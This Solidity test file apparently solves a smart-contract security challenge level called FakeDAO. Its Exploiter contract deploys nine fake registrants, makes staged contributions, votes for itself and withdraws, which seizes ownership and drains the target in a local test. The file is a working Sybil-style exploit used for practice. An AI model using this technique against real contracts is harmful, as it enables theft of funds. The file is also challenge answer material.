// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/10_FakeDAO/FakeDAO.sol";

contract FakeUser {
    constructor(FakeDAO target) {
        target.register();
    }
}

contract Exploiter {
    FakeDAO target;

    constructor(FakeDAO _target) {
        target = _target;
    }

    function attack() external payable {
        //9 фейковых пользователей
        for(uint i = 1; i <= 9; i++) {
            new FakeUser(target);
        }

        //себя последним
        target.register();

        // Делаем вклады для увеличения registered до 10
        target.contribute{value: 0.011 ether}();
        target.contribute{value: 0.022 ether}();
        target.contribute{value: 0.034 ether}();
        target.contribute{value: 0.046 ether}();
        target.contribute{value: 0.058 ether}();
        target.contribute{value: 0.070 ether}();
        target.contribute{value: 0.082 ether}();
        target.contribute{value: 0.094 ether}();
        target.contribute{value: 0.106 ether}();

        target.voteForYourself();
        target.withdraw();
    }

    receive() external payable {}
}


// forge test --match-contract FakeDAOTest -vvvv
contract FakeDAOTest is BaseTest {
    FakeDAO instance;

    function setUp() public override {
        super.setUp();

        instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
    }

    function testExploitLevel() public {
        Exploiter exploiter = new Exploiter(instance);
        exploiter.attack{value: 1 ether}();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.owner() != owner, "Solution is not solving the level");
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
